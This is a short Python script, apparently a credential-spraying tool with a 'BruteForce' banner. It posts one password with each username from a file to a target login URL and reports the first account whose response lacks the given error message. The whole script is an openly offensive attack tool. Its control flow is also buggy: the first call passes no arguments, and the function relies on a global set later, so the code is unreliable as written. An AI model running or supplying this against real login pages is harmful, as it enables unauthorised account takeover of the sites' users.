import requests

targeturl = input("Enter Target Url: ")
targetpass = input("Enter Target Password: ")
error = input("Enter Wrong User Error Message: ")

def passwordSpray(targetpass,targeturl,error):
    print("""
     _____ _               _____                       _  ______            _        __                   
    /  __ | |             |  ___|                     | | | ___ \          | |      / _|                  
    | /  \| | __ _ ___ ___| |__ _ __ __ _ ___  ___  __| | | |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ 
    | |   | |/ _` / __/ __|  __| '__/ _` / __|/ _ \/ _` | | ___ | '__| | | | __/ _ |  _/ _ \| '__/ __/ _ \\
    | \__/| | (_| \__ \__ | |__| | | (_| \__ |  __| (_| | | |_/ | |  | |_| | ||  __| || (_) | | | (_|  __/
     \____|_|\__,_|___|___\____|_|  \__,_|___/\___|\__,_| \____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|\n\n""")
    
    for username in usernames:
        username = username.strip()
        print(f"Trying:", {username})
        data_dict = {"username": username,"password": targetpass,"login":"submit"}
        response = requests.post(targeturl, data=data_dict)
        if error in str(response.content):
            pass
        elif "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            exit(0)
        else:
            print(f"Username: ---> ", {username}, "\n", "Password: ---> ", {targetpass})
            exit(0)

if __name__ == '__main__':
    try:
        passwordSpray()
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")

    #compile list from engagement notes
    with open("usernames.txt", "r") as usernames:
        passwordSpray(targetpass,targeturl,error)
    
    print("[!!] Username not in list")